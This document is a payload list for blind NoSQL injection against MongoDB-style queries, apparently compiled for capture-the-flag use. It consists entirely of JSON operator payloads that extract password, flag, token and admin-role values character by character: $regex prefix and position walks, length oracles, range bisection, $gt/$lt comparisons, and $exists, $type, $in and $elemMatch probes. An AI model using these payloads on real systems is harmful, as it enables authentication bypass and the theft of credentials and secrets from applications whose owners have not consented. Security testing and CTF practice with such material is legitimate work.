# Blind payloads — the oracle-side corpus

## The `$regex` prefix-walk — a-z 0-9

```json
{"pass": {"$regex": "^a"}}    {"pass": {"$regex": "^b"}}
{"pass": {"$regex": "^c"}}    {"pass": {"$regex": "^d"}}
{"pass": {"$regex": "^e"}}    {"pass": {"$regex": "^f"}}
{"pass": {"$regex": "^g"}}    {"pass": {"$regex": "^h"}}
{"pass": {"$regex": "^i"}}    {"pass": {"$regex": "^j"}}
{"pass": {"$regex": "^k"}}    {"pass": {"$regex": "^l"}}
{"pass": {"$regex": "^m"}}    {"pass": {"$regex": "^n"}}
{"pass": {"$regex": "^o"}}    {"pass": {"$regex": "^p"}}
{"pass": {"$regex": "^q"}}    {"pass": {"$regex": "^r"}}
{"pass": {"$regex": "^s"}}    {"pass": {"$regex": "^t"}}
{"pass": {"$regex": "^u"}}    {"pass": {"$regex": "^v"}}
{"pass": {"$regex": "^w"}}    {"pass": {"$regex": "^x"}}
{"pass": {"$regex": "^y"}}    {"pass": {"$regex": "^z"}}
{"pass": {"$regex": "^0"}}    {"pass": {"$regex": "^1"}}
{"pass": {"$regex": "^2"}}    {"pass": {"$regex": "^3"}}
{"pass": {"$regex": "^4"}}    {"pass": {"$regex": "^5"}}
{"pass": {"$regex": "^6"}}    {"pass": {"$regex": "^7"}}
{"pass": {"$regex": "^8"}}    {"pass": {"$regex": "^9"}}
{"pass": {"$regex": "^_"}}    {"pass": {"$regex": "^-"}}
{"pass": {"$regex": "^\\{"}}  {"pass": {"$regex": "^\\}"}}
{"pass": {"$regex": "^flag"}} {"pass": {"$regex": "^flag\\{"}}
{"pass": {"$regex": "^FLAG"}} {"pass": {"$regex": "^HTB"}}
{"pass": {"$regex": "^CTF"}}  {"pass": {"$regex": "^pico"}}
{"pass": {"$regex": "^DUCTF"}} {"pass": {"$regex": "^[a-z]"}}
{"pass": {"$regex": "^[0-9]"}} {"pass": {"$regex": "^[a-f0-9]"}}
{"pass": {"$regex": "^[a-f0-9]{24}$"}}
```

## The position-oracle — `^.{N}c` for N=0..31

```json
{"pass": {"$regex": "^.{0}a"}}   {"pass": {"$regex": "^.{1}a"}}
{"pass": {"$regex": "^.{2}a"}}   {"pass": {"$regex": "^.{3}a"}}
{"pass": {"$regex": "^.{4}a"}}   {"pass": {"$regex": "^.{5}a"}}
{"pass": {"$regex": "^.{6}a"}}   {"pass": {"$regex": "^.{7}a"}}
{"pass": {"$regex": "^.{8}a"}}   {"pass": {"$regex": "^.{9}a"}}
{"pass": {"$regex": "^.{10}a"}}  {"pass": {"$regex": "^.{11}a"}}
{"pass": {"$regex": "^.{12}a"}}  {"pass": {"$regex": "^.{13}a"}}
{"pass": {"$regex": "^.{14}a"}}  {"pass": {"$regex": "^.{15}a"}}
{"pass": {"$regex": "^.{16}a"}}  {"pass": {"$regex": "^.{17}a"}}
{"pass": {"$regex": "^.{18}a"}}  {"pass": {"$regex": "^.{19}a"}}
{"pass": {"$regex": "^.{20}a"}}  {"pass": {"$regex": "^.{21}a"}}
{"pass": {"$regex": "^.{22}a"}}  {"pass": {"$regex": "^.{23}a"}}
{"pass": {"$regex": "^.{24}a"}}  {"pass": {"$regex": "^.{25}a"}}
{"pass": {"$regex": "^.{26}a"}}  {"pass": {"$regex": "^.{27}a"}}
{"pass": {"$regex": "^.{28}a"}}  {"pass": {"$regex": "^.{29}a"}}
{"pass": {"$regex": "^.{30}a"}}  {"pass": {"$regex": "^.{31}a"}}
{"pass": {"$regex": "^.{32}a"}}  {"pass": {"$regex": "^.{64}a"}}
```

## The length-oracle — `^.{N}$`

```json
{"pass": {"$regex": "^.{1}$"}}    {"pass": {"$regex": "^.{2}$"}}
{"pass": {"$regex": "^.{3}$"}}    {"pass": {"$regex": "^.{4}$"}}
{"pass": {"$regex": "^.{5}$"}}    {"pass": {"$regex": "^.{6}$"}}
{"pass": {"$regex": "^.{7}$"}}    {"pass": {"$regex": "^.{8}$"}}
{"pass": {"$regex": "^.{9}$"}}    {"pass": {"$regex": "^.{10}$"}}
{"pass": {"$regex": "^.{11}$"}}   {"pass": {"$regex": "^.{12}$"}}
{"pass": {"$regex": "^.{13}$"}}   {"pass": {"$regex": "^.{14}$"}}
{"pass": {"$regex": "^.{15}$"}}   {"pass": {"$regex": "^.{16}$"}}
{"pass": {"$regex": "^.{17}$"}}   {"pass": {"$regex": "^.{18}$"}}
{"pass": {"$regex": "^.{19}$"}}   {"pass": {"$regex": "^.{20}$"}}
{"pass": {"$regex": "^.{21}$"}}   {"pass": {"$regex": "^.{22}$"}}
{"pass": {"$regex": "^.{23}$"}}   {"pass": {"$regex": "^.{24}$"}}
{"pass": {"$regex": "^.{25}$"}}   {"pass": {"$regex": "^.{26}$"}}
{"pass": {"$regex": "^.{27}$"}}   {"pass": {"$regex": "^.{28}$"}}
{"pass": {"$regex": "^.{29}$"}}   {"pass": {"$regex": "^.{30}$"}}
{"pass": {"$regex": "^.{31}$"}}   {"pass": {"$regex": "^.{32}$"}}
{"pass": {"$regex": "^.{40}$"}}   {"pass": {"$regex": "^.{48}$"}}
{"pass": {"$regex": "^.{64}$"}}   {"pass": {"$regex": "^.{100}$"}}
{"pass": {"$regex": "^.{1,10}$"}} {"pass": {"$regex": "^.{10,20}$"}}
{"pass": {"$regex": "^.{20,50}$"}} {"pass": {"$regex": "^.{30,}$"}}
{"pass": {"$regex": "^.{50,}$"}}  {"pass": {"$regex": "^.{100,}$"}}
```

## The range-bisect — `^.{N}[a-m]`

```json
{"pass": {"$regex": "^.{0}[a-m]"}}    {"pass": {"$regex": "^.{0}[n-z]"}}
{"pass": {"$regex": "^.{0}[a-f]"}}    {"pass": {"$regex": "^.{0}[g-m]"}}
{"pass": {"$regex": "^.{0}[0-9]"}}    {"pass": {"$regex": "^.{0}[a-f0-9]"}}
{"pass": {"$regex": "^.{0}[0-7]"}}    {"pass": {"$regex": "^.{0}[8-9a-f]"}}
{"pass": {"$regex": "^.{1}[a-m]"}}    {"pass": {"$regex": "^.{1}[0-9]"}}
{"pass": {"$regex": "^.{2}[a-m]"}}    {"pass": {"$regex": "^.{2}[0-9]"}}
{"pass": {"$regex": "^.{3}[a-m]"}}    {"pass": {"$regex": "^.{3}[0-9]"}}
{"pass": {"$regex": "^.{4}[a-m]"}}    {"pass": {"$regex": "^.{4}[0-9]"}}
{"pass": {"$regex": "^.{5}[a-m]"}}    {"pass": {"$regex": "^.{5}[0-9]"}}
{"pass": {"$regex": "^.{10}[a-m]"}}   {"pass": {"$regex": "^.{10}[0-9]"}}
{"pass": {"$regex": "^.{15}[a-m]"}}   {"pass": {"$regex": "^.{15}[0-9]"}}
{"pass": {"$regex": "^.{20}[a-m]"}}   {"pass": {"$regex": "^.{20}[0-9]"}}
{"pass": {"$regex": "^.{25}[a-m]"}}   {"pass": {"$regex": "^.{25}[0-9]"}}
{"pass": {"$regex": "^.{30}[a-m]"}}   {"pass": {"$regex": "^.{30}[0-9]"}}
```

## The `$gt` bisect — the lex-compare

```json
{"pass": {"$gt": ""}}      {"pass": {"$gt": "a"}}
{"pass": {"$gt": "m"}}     {"pass": {"$gt": "z"}}
{"pass": {"$gte": ""}}     {"pass": {"$gte": "flag"}}
{"pass": {"$gte": "a"}}    {"pass": {"$gte": "m"}}
{"pass": {"$lt": "m"}}     {"pass": {"$lt": "z"}}
{"pass": {"$lte": "m"}}    {"pass": {"$lte": "z"}}
{"pass": {"$gt": "m", "$lt": "z"}}
{"pass": {"$gte": "a", "$lt": "n"}}
{"pass": {"$gte": "0", "$lt": "g"}}
{"pass": {"$gte": "flag{a", "$lt": "flag{n"}}
{"pass": {"$gt": "flag{m"}}
{"pass": {"$lt": "flag{n"}}
{"pass": {"$gt": "flag{m", "$lt": "flag{n"}}
{"pass": {"$gte": "f", "$lt": "g"}}
{"pass": {"$gt": "f", "$lte": "g"}}
{"pass": {"$gte": "flag{", "$lte": "flag\\}"}}
```

## The `$exists`/`$type` — the field-shape

```json
{"flag": {"$exists": true}}      {"flag": {"$exists": false}}
{"flag": {"$ne": null}}          {"flag": {"$eq": null}}
{"flag": {"$type": "string"}}    {"flag": {"$type": 2}}
{"flag": {"$type": "object"}}    {"flag": {"$type": "array"}}
{"flag": {"$type": "bool"}}      {"flag": {"$type": "objectId"}}
{"flag": {"$type": "number"}}    {"flag": {"$type": "int"}}
{"flag": {"$type": "long"}}      {"flag": {"$type": "double"}}
{"flag": {"$type": "date"}}      {"flag": {"$type": "regex"}}
{"flag": {"$type": "javascript"}} {"flag": {"$type": "null"}}
{"flag": {"$type": 10}}          {"flag": {"$type": 16}}
{"flag": {"$size": 32}}          {"flag": {"$size": 64}}
{"flag": {"$size": 0}}           {"flag": {"$size": {"$gt": 0}}}
{"secret": {"$exists": true}}    {"token": {"$exists": true}}
{"key": {"$exists": true}}       {"pass": {"$exists": true}}
{"admin": {"$exists": true}}     {"role": {"$exists": true}}
{"isAdmin": {"$exists": true}}   {"is_admin": {"$exists": true}}
{"privileges": {"$exists": true}} {"permission": {"$exists": true}}
```

## The `$in`/`$nin` — the set-oracle

```json
{"pass": {"$in": ["a", "b", "c"]}}
{"pass": {"$in": ["flag", "secret", "key"]}}
{"pass": {"$in": ["f", "l", "a", "g"]}}
{"pass": {"$nin": ["x", "y"]}}
{"pass": {"$nin": []}}
{"pass": {"$nin": ["a"]}}
{"user": {"$in": ["admin", "root", "system"]}}
{"user": {"$in": ["admin"]}}
{"role": {"$in": ["admin", "root"]}}
{"user": {"$all": ["admin", "user"]}}
{"user": {"$all": []}}
{"pass": {"$all": ["a"]}}
```

## The `$elemMatch` — the array-subdoc

```json
{"items": {"$elemMatch": {"price": {"$gt": 0}}}}
{"items": {"$elemMatch": {"name": {"$regex": "^flag"}}}}
{"items": {"$elemMatch": {"name": "x", "price": {"$gt": 0}}}}
{"items": {"$elemMatch": {"$and": [{"a": 1}, {"b": 2}]}}}
{"items": {"$elemMatch": {"$or": [{"a": 1}, {"b": 2}]}}}
{"flags": {"$elemMatch": {"$regex": "^a"}}}
{"tokens": {"$elemMatch": {"value": {"$regex": "^flag"}}}}
{"roles": {"$elemMatch": {"$eq": "admin"}}}
{"perms": {"$elemMatch": {"$in": ["admin"]}}}
{"users": {"$elemMatch": {"role": "admin"}}}
{"data": {"$elemMatch": {"k": "flag", "v": {"$regex": "^a"}}}}
{"docs": {"$elemMatch": {"flag": {"$exists": true}}}}
{"records": {"$elemMatch": {"flag": {"$ne": null}}}}
{"users": {"$elemMatch": {"user": "admin", "pass": {"$regex": "^a"}}}}
{"tokens": {"$elemMatch": {"user": "admin", "value": {"$exists": true}}}}
```
